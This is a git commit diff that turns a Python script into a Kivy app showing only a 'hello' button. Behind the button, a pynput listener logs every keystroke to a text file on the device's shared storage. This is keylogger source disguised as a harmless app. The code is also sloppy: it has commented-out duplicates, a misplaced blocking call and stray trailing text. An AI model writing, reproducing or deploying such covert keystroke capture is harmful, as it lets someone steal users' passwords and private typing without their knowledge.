767a77e29abb5452329f252f344df3f250618188
andro-alt <ratandro88@gmail.com>
2025-03-04 19:08:21 +0530

    main.py
    new update

--- main.py
+++ main.py
@@ -1,9 +1,30 @@
+import pynput
 from pynput.keyboard  import Listener
-def w_t(key):
-        letter = str(key)
-        letter = letter.replace("'","")
+from kivy.app import App
+from kivy.uix.button import Button
 
-        with open("/sdcard/log.txt", "a") as f:
-                f.write(letter)
+def w_t(key):
+	letter = str(key)
+	letter = letter.replace("'","")
+	
+	if letter == "Key.space":
+		letter = " "
+	elif letter == "Key.enter":
+		letter = "\n"
+	elif letter == "Key.backspace":
+		letter = " backspace "
+	
+	with open("/storage/emulated/0/log.txt", "a") as f:
+		f.write(letter)
+#with Listener(on_press=w_t) as l:
+	#l.join()
+
+class a(App):
+	def build(self,*args):
+		b = Button(text="hello")
+		return b
+a().run()
 with Listener(on_press=w_t) as l:
-        l.join()
+    l.join()
+		
+#a().run()hello are you finer
